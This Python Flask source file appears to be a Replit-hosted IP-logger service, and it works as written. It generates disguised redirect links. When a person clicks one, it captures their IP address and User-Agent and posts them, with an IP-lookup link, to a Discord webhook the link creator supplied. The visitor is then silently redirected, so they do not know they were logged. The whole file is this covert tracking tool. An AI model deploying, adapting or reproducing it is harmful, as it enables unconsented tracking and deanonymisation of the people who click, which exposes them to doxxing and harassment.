from flask import Flask,request,redirect
import random,requests
from replit import db

DOMAIN = "PUT UR DOMAIN LINK HERE EG. www.clanns.cf"


acsii = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
app = Flask('app')
template = {
  "content": ' ',
  "embeds": [
    {
      "title": "Click Here For More Info",
      "description": "",
      "url": "",
      "color": 16472319
    }
  ],
  "username": "nsxfa logger", 
  "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCEAwAsOa4qU4_Y-7EUYkIMP4BdYOFkk5p25yhJ0JaNSbocsToR8f8bvbGFltOh7oSnCA&usqp=CAU",
  "attachments": []
}
sess = requests.session()
def genfun():
  total = ""
  for i in range(5):
    total = total + random.choice(acsii)
  return total

@app.route('/',methods=['GET'])
def homepage():
  return ''

@app.route('/c',methods=['GET'])
def call():
  data = request.args.get('i')
  if data == None:
    return ""
  if db[data] != None:
    i = db[data]
    i = i.strip()
    i = i.split("|")
   
    whid = i[0]
    webs = i[1]
    if whid != None:
      tempload = template
      ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
      tempload["embeds"][0]["description"] = f"IP: {str(ip)}\nUserAgent: {request.headers.get('User-Agent')}"
      tempload['embeds'][0]['url'] = f"https://www.ip-tracker.org/lookup.php?ip={str(ip)}" 
      sess.post(whid,json=tempload)
      return redirect(webs,302)
  return ''
      
    

  
@app.route('/create',methods=['GET'])
def newhook():
  hook = request.args.get('hook')
  redir = request.args.get('redir')
  if hook == None or redir == None:
    return "error encountered",501
  newgen = genfun()
  db[newgen] = hook + "|" + redir
  return f'This is your key, DO NOT LOOSE THIS: https://{DOMAIN}/c?i=' +newgen


@app.errorhandler(404)
def page_not_found(e):
    return "page not found",404

app.run(host='0.0.0.0', port=8080)
